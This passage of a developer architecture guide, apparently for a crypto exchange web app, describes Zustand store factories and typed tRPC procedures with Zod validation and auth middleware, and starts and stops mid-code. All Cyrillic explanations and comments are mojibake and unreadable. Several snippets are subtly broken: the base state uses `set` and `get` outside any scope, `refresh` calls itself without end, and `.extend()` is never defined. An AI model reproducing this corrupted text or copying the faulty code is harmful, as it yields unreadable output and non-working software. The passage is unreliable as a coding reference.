            // –£–Ω–∏–∫–∞–ª—å–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ store
            ...storeDefinition(set, get, api),

            // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª—è–µ–º—ã–µ –º–µ—Ç–æ–¥—ã
            reset: () =>
              set(draft => {
                Object.assign(draft, getInitialState());
              }),

            updateField: (field: keyof T, value: any) =>
              set(draft => {
                draft[field] = value;
              }),

            batchUpdate: (updates: Partial<T>) =>
              set(draft => {
                Object.assign(draft, updates);
              }),
          })),
          {
            name: `exchanger-${name}`, // –£–Ω–∏–∫–∞–ª—å–Ω–æ–µ –∏–º—è –¥–ª—è localStorage
            version: 1,
            partialize: state => ({
              // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–æ–ª—å–∫–æ –Ω—É–∂–Ω—ã–µ –ø–æ–ª—è
              ...omitSensitiveData(state),
            }),
          }
        )
      ),
      { name: name } // –ò–º—è –¥–ª—è Redux DevTools
    )
  );
};
```

**2. –ë–∞–∑–æ–≤–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ —Å –æ–±—â–∏–º–∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—è–º–∏:**

```typescript
interface BaseStoreState {
  // –°–æ—Å—Ç–æ—è–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏
  isLoading: boolean;
  isFetching: boolean;

  // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫
  error: string | null;
  lastError: Error | null;

  // –ú–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ
  lastUpdated: Date | null;
  cacheTimeout: number;

  // –û–±—â–∏–µ –º–µ—Ç–æ–¥—ã
  setLoading: (loading: boolean) => void;
  setError: (error: string | null) => void;
  clearError: () => void;
  refresh: () => Promise<void>;
}

const baseStoreState: BaseStoreState = {
  isLoading: false,
  isFetching: false,
  error: null,
  lastError: null,
  lastUpdated: null,
  cacheTimeout: 5 * 60 * 1000, // 5 –º–∏–Ω—É—Ç

  setLoading: loading => set({ isLoading: loading }),
  setError: error => set({ error, lastError: error ? new Error(error) : null }),
  clearError: () => set({ error: null, lastError: null }),

  refresh: async () => {
    const state = get();
    if (state.refresh) {
      await state.refresh();
    }
  },
};
```

**3. –°–ø–µ—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ–∞–±—Ä–∏–∫–∏ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö —Ç–∏–ø–æ–≤ –¥–∞–Ω–Ω—ã—Ö:**

```typescript
// –§–∞–±—Ä–∏–∫–∞ –¥–ª—è –¥–∞–Ω–Ω—ã—Ö —Å API
export const createApiStore = <T>(name: string, apiEndpoint: string) => {
  return createStore(name, (set, get) => ({
    data: [] as T[],

    fetch: async () => {
      set({ isLoading: true, error: null });
      try {
        const response = await fetch(apiEndpoint);
        const data = await response.json();
        set({
          data,
          isLoading: false,
          lastUpdated: new Date(),
        });
      } catch (error) {
        set({
          error: error.message,
          isLoading: false,
        });
      }
    },

    invalidate: () => set({ lastUpdated: null }),

    isStale: () => {
      const { lastUpdated, cacheTimeout } = get();
      if (!lastUpdated) return true;
      return Date.now() - lastUpdated.getTime() > cacheTimeout;
    },
  }));
};

// –§–∞–±—Ä–∏–∫–∞ –¥–ª—è —Ñ–æ—Ä–º
export const createFormStore = <T extends Record<string, any>>(
  name: string,
  initialValues: T,
  validationSchema?: z.ZodSchema<T>
) => {
  return createStore(name, (set, get) => ({
    values: initialValues,
    errors: {} as Record<keyof T, string>,
    touched: {} as Record<keyof T, boolean>,
    isSubmitting: false,

    setValue: (field: keyof T, value: any) =>
      set(draft => {
        draft.values[field] = value;
        draft.touched[field] = true;

        // –í–∞–ª–∏–¥–∞—Ü–∏—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
        if (validationSchema) {
          const result = validationSchema.safeParse(draft.values);
          if (!result.success) {
            const fieldError = result.error.errors.find(e => e.path[0] === field);
            if (fieldError) {
              draft.errors[field] = fieldError.message;
            }
          } else {
            delete draft.errors[field];
          }
        }
      }),

    submit: async (onSubmit: (values: T) => Promise<void>) => {
      set({ isSubmitting: true });
      try {
        await onSubmit(get().values);
      } finally {
        set({ isSubmitting: false });
      }
    },

    reset: () =>
      set({
        values: initialValues,
        errors: {},
        touched: {},
        isSubmitting: false,
      }),
  }));
};
```

#### üéØ **–ü–†–ï–ò–ú–£–©–ï–°–¢–í–ê –î–õ–Ø –ö–û–ú–ê–ù–î–´ –†–ê–ó–†–ê–ë–û–¢–ö–ò**

**1. –ö–æ–Ω—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç—å API:**

```typescript
// –í—Å–µ stores –∏–º–µ—é—Ç –æ–¥–∏–Ω–∞–∫–æ–≤—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
const currencyStore = useCurrencyStore();
const orderStore = useOrderStore();

// –û–¥–∏–Ω–∞–∫–æ–≤—ã–µ –º–µ—Ç–æ–¥—ã –¥–ª—è –≤—Å–µ—Ö stores
currencyStore.setLoading(true); // ‚úÖ –ï—Å—Ç—å –≤–µ–∑–¥–µ
orderStore.setLoading(true); // ‚úÖ –ï—Å—Ç—å –≤–µ–∑–¥–µ

currencyStore.reset(); // ‚úÖ –ï—Å—Ç—å –≤–µ–∑–¥–µ
orderStore.reset(); // ‚úÖ –ï—Å—Ç—å –≤–µ–∑–¥–µ
```

**2. –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –∏–∑ –∫–æ—Ä–æ–±–∫–∏:**

- **Redux DevTools** - –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è
- **Persistence** - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ localStorage
- **Subscriptions** - –ø–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö –ø–æ–ª–µ–π
- **Immer** - —É–¥–æ–±–Ω–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è
- **Error handling** - —É–Ω–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫

**3. –õ–µ–≥–∫–æ—Å—Ç—å —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è:**

```typescript
// –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ñ–∞–±—Ä–∏–∫—É –æ–¥–∏–Ω —Ä–∞–∑ - —Ä–∞–±–æ—Ç–∞–µ—Ç –¥–ª—è –≤—Å–µ—Ö stores
describe('Store Factory', () => {
  it('should add base functionality to all stores', () => {
    const testStore = createStore('test', () => ({ value: 0 }));
    const store = testStore.getState();

    expect(store.setLoading).toBeDefined(); // ‚úÖ –ë–∞–∑–æ–≤–∞—è —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å
    expect(store.setError).toBeDefined(); // ‚úÖ –ï—Å—Ç—å –≤–æ –≤—Å–µ—Ö stores
    expect(store.reset).toBeDefined(); // ‚úÖ –û–±—â–∏–µ –º–µ—Ç–æ–¥—ã
  });
});
```

#### ‚ö†Ô∏è **–ß–¢–û –ü–†–û–ò–°–•–û–î–ò–¢ –ë–ï–ó STORE FACTORY**

**–ü—Ä–æ–±–ª–µ–º–∞ ‚Ññ1: –î—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–¥–∞ –≤ –∫–∞–∂–¥–æ–º store**

```typescript
// ‚ùå –ö–æ–ø–∏–ø–∞—Å—Ç–∞ –≤ 10+ stores
const useStore1 = create(set => ({
  isLoading: false,
  error: null,
  setLoading: loading => set({ isLoading: loading }),
  setError: error => set({ error }),
  // ... 50 —Å—Ç—Ä–æ–∫ –æ–¥–∏–Ω–∞–∫–æ–≤–æ–≥–æ –∫–æ–¥–∞
}));

const useStore2 = create(set => ({
  isLoading: false,
  error: null,
  setLoading: loading => set({ isLoading: loading }), // –û–ø—è—Ç—å —Ç–æ –∂–µ —Å–∞–º–æ–µ
  setError: error => set({ error }), // –ò —Å–Ω–æ–≤–∞...
  // ... –µ—â–µ 50 —Å—Ç—Ä–æ–∫ –¥—É–±–ª—è–∂–∞
}));
```

**–ü—Ä–æ–±–ª–µ–º–∞ ‚Ññ2: –ù–µ—Å–æ–≥–ª–∞—Å–æ–≤–∞–Ω–Ω–æ—Å—Ç—å –º–µ–∂–¥—É stores**

```typescript
// ‚ùå –†–∞–∑–Ω—ã–µ API –≤ —Ä–∞–∑–Ω—ã—Ö stores
const useStore1 = create(() => ({
  loading: false, // –í –æ–¥–Ω–æ–º store "loading"
  setLoadingState: () => {}, // –ò –º–µ—Ç–æ–¥ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è –ø–æ-–¥—Ä—É–≥–æ–º—É
}));

const useStore2 = create(() => ({
  isLoading: false, // –í –¥—Ä—É–≥–æ–º "isLoading"
  updateLoading: () => {}, // –ò —Å–Ω–æ–≤–∞ –¥—Ä—É–≥–æ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –º–µ—Ç–æ–¥–∞
}));

// –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ –ø—É—Ç–∞—é—Ç—Å—è –∫–∞–∫–æ–π API –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å!
```

**–ü—Ä–æ–±–ª–µ–º–∞ ‚Ññ3: –ó–∞–±—ã–≤—á–∏–≤–æ—Å—Ç—å –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –Ω–æ–≤—ã—Ö stores**

```typescript
// ‚ùå –ù–æ–≤—ã–π store –±–µ–∑ –≤–∞–∂–Ω—ã—Ö –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π
const useNewFeatureStore = create(set => ({
  data: [],
  fetch: async () => {
    /* –ª–æ–≥–∏–∫–∞ */
  },
  // –ó–∞–±—ã–ª–∏ –¥–æ–±–∞–≤–∏—Ç—å devtools - —Å–ª–æ–∂–Ω–æ –æ—Ç–ª–∞–∂–∏–≤–∞—Ç—å
  // –ó–∞–±—ã–ª–∏ –¥–æ–±–∞–≤–∏—Ç—å persist - –¥–∞–Ω–Ω—ã–µ –Ω–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è
  // –ó–∞–±—ã–ª–∏ –¥–æ–±–∞–≤–∏—Ç—å error handling - –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∫—Ä–∞—à–∏—Ç—Å—è
}));
```

#### üõ†Ô∏è **–ö–û–ì–î–ê AI –°–û–ó–î–ê–ï–¢ –ù–û–í–´–ô STORE**

**–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ —Ä–µ—à–µ–Ω–∏—è:**

1. **–ü—Ä–æ—Å—Ç—ã–µ –¥–∞–Ω–Ω—ã–µ** ‚Üí `createStore()` —Å –±–∞–∑–æ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å—é
2. **API –¥–∞–Ω–Ω—ã–µ** ‚Üí `createApiStore()` —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –∑–∞–≥—Ä—É–∑–∫–æ–π
3. **–§–æ—Ä–º—ã** ‚Üí `createFormStore()` —Å –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π
4. **–ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ** ‚Üí `createCacheStore()` —Å TTL –∏ –∏–Ω–≤–∞–ª–∏–¥–∞—Ü–∏–µ–π

**–ü—Ä–∏–º–µ—Ä –ø—Ä–∏–Ω—è—Ç–∏—è —Ä–µ—à–µ–Ω–∏—è:**

```typescript
// AI –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è:
// - –ù—É–∂–Ω–æ –∑–∞–≥—Ä—É–∂–∞—Ç—å –¥–∞–Ω–Ω—ã–µ —Å API ‚úÖ
// - –ù—É–∂–Ω–æ –∫–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ ‚úÖ
// - –ù—É–∂–Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ ‚úÖ
// - –°–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è –≤–∞–ª—é—Ç ‚úÖ

// –†–µ—à–µ–Ω–∏–µ: API Store + —Å–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∞—è –ª–æ–≥–∏–∫–∞
export const useCurrencyStore = createApiStore<Currency>('currencies', '/api/currencies').extend(
  (set, get) => ({
    // –î–æ–±–∞–≤–ª—è–µ–º —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—É—é –¥–ª—è –≤–∞–ª—é—Ç –ª–æ–≥–∏–∫—É
    selectedPair: null as CurrencyPair | null,

    selectPair: (from: string, to: string) =>
      set({
        selectedPair: { from, to },
      }),

    getExchangeRate: (from: string, to: string) => {
      const currencies = get().data;
      // –õ–æ–≥–∏–∫–∞ —Ä–∞—Å—á–µ—Ç–∞ –∫—É—Ä—Å–∞...
    },
  })
);
```

**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**:

- `store-factory.ts` - –æ—Å–Ω–æ–≤–Ω–∞—è —Ñ–∞–±—Ä–∏–∫–∞
- `api-store-factory.ts` - –¥–ª—è API –¥–∞–Ω–Ω—ã—Ö
- `form-store-factory.ts` - –¥–ª—è —Ñ–æ—Ä–º
- `currency-store.ts`, `order-store.ts` - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ–∞–±—Ä–∏–∫

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** –ù–æ–≤—ã–µ stores —Å–æ–∑–¥–∞—é—Ç—Å—è –∑–∞ –º–∏–Ω—É—Ç—ã –≤–º–µ—Å—Ç–æ —á–∞—Å–æ–≤, —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –≤—Å–µ—Ö –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π –∏ –∫–æ–Ω—Å–∏—Å—Ç–µ–Ω—Ç–Ω—ã–º API.

---

### üìã **–ü–∞—Ç—Ç–µ—Ä–Ω 4: tRPC Procedure (–¢–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ API)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –í—Å–µ API endpoints (`apps/web/src/server/trpc/routers/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –¥–æ–≥–æ–≤–æ—Ä –º–µ–∂–¥—É –æ—Ñ–∏—Ü–∏–∞–Ω—Ç–æ–º –∏ –ø–æ–≤–∞—Ä–æ–º - —á–µ—Ç–∫–æ–µ –ø–æ–Ω–∏–º–∞–Ω–∏–µ —á—Ç–æ –∑–∞–∫–∞–∑–∞–Ω–æ

#### üß† **–î–ï–¢–ê–õ–¨–ù–û–ï –û–ë–™–Ø–°–ù–ï–ù–ò–ï –ü–ê–¢–¢–ï–†–ù–ê**

**–ü—Ä–æ–±–ª–µ–º–∞ –∫–æ—Ç–æ—Ä—É—é —Ä–µ—à–∞–µ—Ç:**
–í –æ–±—ã—á–Ω—ã—Ö API –Ω–µ—Ç –≥–∞—Ä–∞–Ω—Ç–∏–π —á—Ç–æ –∫–ª–∏–µ–Ω—Ç –∏ —Å–µ—Ä–≤–µ—Ä –ø–æ–Ω–∏–º–∞—é—Ç –¥—Ä—É–≥ –¥—Ä—É–≥–∞. –≠—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –æ—à–∏–±–∫–∞–º –≤—Ä–µ–º–µ–Ω–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:

```typescript
// ‚ùå –û–±—ã—á–Ω—ã–π REST API - –º–Ω–æ–≥–æ –ø—Ä–æ–±–ª–µ–º
// –ù–∞ —Å–µ—Ä–≤–µ—Ä–µ:
app.post('/api/exchange', (req, res) => {
  const { amount, fromCurrency, toCurrency } = req.body;
  // –ß—Ç–æ –µ—Å–ª–∏ amount - —Å—Ç—Ä–æ–∫–∞, –∞ –Ω–µ —á–∏—Å–ª–æ?
  // –ß—Ç–æ –µ—Å–ª–∏ fromCurrency –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è?
  // –ß—Ç–æ –µ—Å–ª–∏ –∫—Ç–æ-—Ç–æ –ø–µ—Ä–µ–¥–∞—Å—Ç XSS –∫–æ–¥?

  const result = performExchange(amount, fromCurrency, toCurrency);
  res.json(result); // –ö–∞–∫–æ–π —Ç–∏–ø —É result? –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ!
});

// –ù–∞ –∫–ª–∏–µ–Ω—Ç–µ:
const response = await fetch('/api/exchange', {
  method: 'POST',
  body: JSON.stringify({
    amount: 100,
    fromCurrency: 'BTC',
    toCurrency: 'USD',
  }),
});

const result = await response.json();
// TypeScript –Ω–µ –∑–Ω–∞–µ—Ç —á—Ç–æ –≤ result!
// result.exchangeId - –º–æ–∂–µ—Ç –Ω–µ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞—Ç—å
// result.rate - –º–æ–∂–µ—Ç –±—ã—Ç—å string –≤–º–µ—Å—Ç–æ number
```

**–†–µ—à–µ–Ω–∏–µ —á–µ—Ä–µ–∑ tRPC Procedure:**

```typescript
// ‚úÖ tRPC - –ø–æ–ª–Ω–∞—è —Ç–∏–ø–∏–∑–∞—Ü–∏—è –∏ –≤–∞–ª–∏–¥–∞—Ü–∏—è
export const exchangeRouter = t.router({
  createOrder: t.procedure
    .input(securityEnhancedCreateOrderSchema) // –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–∞
    .output(createOrderResponseSchema) // –¢–∏–ø–∏–∑–∞—Ü–∏—è –≤—ã—Ö–æ–¥–∞
    .mutation(async ({ input, ctx }) => {
      // input —É–∂–µ –ø—Ä–æ–≤–µ—Ä–µ–Ω –∏ —Ç–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω
      // ctx —Å–æ–¥–µ—Ä–∂–∏—Ç –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

      const result = await performExchange(input);

      // TypeScript –ø—Ä–æ–≤–µ—Ä–∏—Ç —á—Ç–æ result —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç schema
      return result;
    }),

  getOrderStatus: t.procedure
    .input(z.object({ orderId: z.string().uuid() }))
    .output(orderStatusSchema)
    .query(async ({ input }) => {
      return await getOrderStatus(input.orderId);
    }),
});

// –ù–∞ –∫–ª–∏–µ–Ω—Ç–µ - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è —Ç–∏–ø–∏–∑–∞—Ü–∏—è:
const trpc = api.useContext();

// TypeScript –∑–Ω–∞–µ—Ç –≤—Å–µ —Ç–∏–ø—ã!
const { data, isLoading } = api.exchange.createOrder.useMutation({
  onSuccess: result => {
    // result –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ç–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω –∫–∞–∫ CreateOrderResponse
    console.log(result.orderId); // ‚úÖ TypeScript –∑–Ω–∞–µ—Ç —á—Ç–æ —ç—Ç–æ string
    console.log(result.rate); // ‚úÖ TypeScript –∑–Ω–∞–µ—Ç —á—Ç–æ —ç—Ç–æ number
  },
});
```

#### üîß **–ö–ê–ö –≠–¢–û –†–ê–ë–û–¢–ê–ï–¢ –¢–ï–•–ù–ò–ß–ï–°–ö–ò**

**1. –°—Ö–µ–º—ã –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –∫–∞–∫ –∫–æ–Ω—Ç—Ä–∞–∫—Ç—ã:**

```typescript
// –í—Ö–æ–¥–Ω–∞—è —Å—Ö–µ–º–∞ —Å –ø–æ–ª–Ω–æ–π –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π
export const createOrderInputSchema = z.object({
  fromCurrency: z.enum(['BTC', 'ETH', 'USDT'], {
    errorMap: () => ({ message: '–ù–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º–∞—è –≤–∞–ª—é—Ç–∞' }),
  }),
  toCurrency: z.enum(['USD', 'EUR', 'RUB'], {
    errorMap: () => ({ message: '–ù–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º–∞—è –≤–∞–ª—é—Ç–∞ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—è' }),
  }),
  amount: z
    .number()
    .positive('–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π')
    .max(1000000, '–ü—Ä–µ–≤—ã—à–µ–Ω –º–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π –ª–∏–º–∏—Ç')
    .refine(val => Number.isFinite(val), '–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —Å—É–º–º–∞'),
  fromWallet: z
    .string()
    .min(26, '–°–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞')
    .max(62, '–°–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞')
    .refine(isValidWalletAddress, '–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞'),
  toWallet: z
    .string()
    .min(10, '–°–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π —Ä–µ–∫–≤–∏–∑–∏—Ç')
    .refine(isValidBankAccount, '–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–µ –±–∞–Ω–∫–æ–≤—Å–∫–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã'),
});

// –í—ã—Ö–æ–¥–Ω–∞—è —Å—Ö–µ–º–∞ –¥–ª—è TypeScript
export const createOrderResponseSchema = z.object({
  orderId: z.string().uuid(),
  status: z.enum(['pending', 'processing', 'completed', 'failed']),
  estimatedRate: z.number().positive(),
  actualRate: z.number().positive().optional(),
  createdAt: z.date(),
  expiresAt: z.date(),
  fromAmount: z.number().positive(),
  toAmount: z.number().positive(),
  fees: z.object({
    networkFee: z.number(),
    serviceFee: z.number(),
    totalFee: z.number(),
  }),
});

// TypeScript –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–æ–∑–¥–∞–µ—Ç —Ç–∏–ø—ã
type CreateOrderInput = z.infer<typeof createOrderInputSchema>;
type CreateOrderResponse = z.infer<typeof createOrderResponseSchema>;
```

**2. –ü—Ä–æ—Ü–µ–¥—É—Ä—ã —Å –∫–æ–Ω—Ç–µ–∫—Å—Ç–æ–º –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–µ–π:**

```typescript
// Middleware –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
const isAuthorized = t.middleware(async ({ ctx, next }) => {
  if (!ctx.user) {
    throw new TRPCError({
      code: 'UNAUTHORIZED',
      message: '–¢—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è',
    });
  }

  return next({
    ctx: {
      ...ctx,
      user: ctx.user, // –¢–µ–ø–µ—Ä—å user –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
    },
  });
});

// Middleware –¥–ª—è rate limiting
const rateLimited = t.middleware(async ({ ctx, next }) => {
  const userId = ctx.user?.id;
  if (userId && (await isRateLimited(userId))) {
    throw new TRPCError({
      code: 'TOO_MANY_REQUESTS',
      message: '–°–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.',
    });
  }

  return next();
});

// –ó–∞—â–∏—â–µ–Ω–Ω–∞—è –ø—Ä–æ—Ü–µ–¥—É—Ä–∞ —Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–µ–π
const protectedProcedure = t.procedure.use(isAuthorized).use(rateLimited);

// –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ —Ä–æ—É—Ç–µ—Ä–µ
export const exchangeRouter = t.router({
  createOrder: protectedProcedure
    .input(createOrderInputSchema)
    .output(createOrderResponseSchema)
    .mutation(async ({ input, ctx }) => {
      // ctx.user –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
      // input –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ –≤–∞–ª–∏–¥–µ–Ω

      const order = await createExchangeOrder({
        ...input,
        userId: ctx.user.id,
        userTier: ctx.user.tier,
      });

      return order; // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è output schema
    }),

  getUserOrders: protectedProcedure
    .input(
      z.object({
        page: z.number().min(1).default(1),
        limit: z.number().min(1).max(100).default(20),
        status: orderStatusSchema.optional(),
      })
    )
    .output(
      z.object({
        orders: z.array(createOrderResponseSchema),
        total: z.number(),
        hasMore: z.boolean(),
      })
    )
    .query(async ({ input, ctx }) => {
      return await getUserOrders(ctx.user.id, input);
    }),
});
```

**3. –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª–∏–µ–Ω—Ç—Å–∫–æ–≥–æ –∫–æ–¥–∞:**

```typescript
// tRPC –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–æ–∑–¥–∞–µ—Ç —Ç–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ö—É–∫–∏
export const api = createTRPCNext<AppRouter>({
  config() {
    return {
      links: [
        httpBatchLink({
          url: '/api/trpc'
        })
      ]
    };
  },
  ssr: false
});

// –í –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞—Ö - –ø–æ–ª–Ω–∞—è —Ç–∏–ø–∏–∑–∞—Ü–∏—è
const ExchangeForm = () => {
  // Hook –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ç–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω
  const createOrder = api.exchange.createOrder.useMutation({
    onSuccess: (data) => {
      // data –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ç–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω –∫–∞–∫ CreateOrderResponse
      toast.success(`–ó–∞–∫–∞–∑ ${data.orderId} —Å–æ–∑–¥–∞–Ω`);
      router.push(`/orders/${data.orderId}`);
    },
    onError: (error) => {
      // error —Å–æ–¥–µ—Ä–∂–∏—Ç –¥–µ—Ç–∞–ª–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏
      if (error.data?.zodError) {
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—à–∏–±–∫–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏
        const fieldErrors = error.data.zodError.fieldErrors;
        Object.entries(fieldErrors).forEach(([field, messages]) => {
          setFieldError(field, messages?.[0]);
        });
      }
    }
  });

  const handleSubmit = (formData: CreateOrderInput) => {
    // TypeScript –ø—Ä–æ–≤–µ—Ä–∏—Ç —á—Ç–æ formData —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç schema
    createOrder.mutate(formData);
  };

  return (
    <form onSubmit={handleSubmit}>
      {/* –¢–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Ñ–æ—Ä–º–∞ */}
    </form>
  );
};
```

#### üéØ **–ü–†–ï–ò–ú–£–©–ï–°–¢–í–ê –î–õ–Ø –ö–û–ú–ê–ù–î–´ –†–ê–ó–†–ê–ë–û–¢–ö–ò**

**1. –ü–æ–ª–Ω–∞—è —Ç–∏–ø–æ–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å:**

```typescript
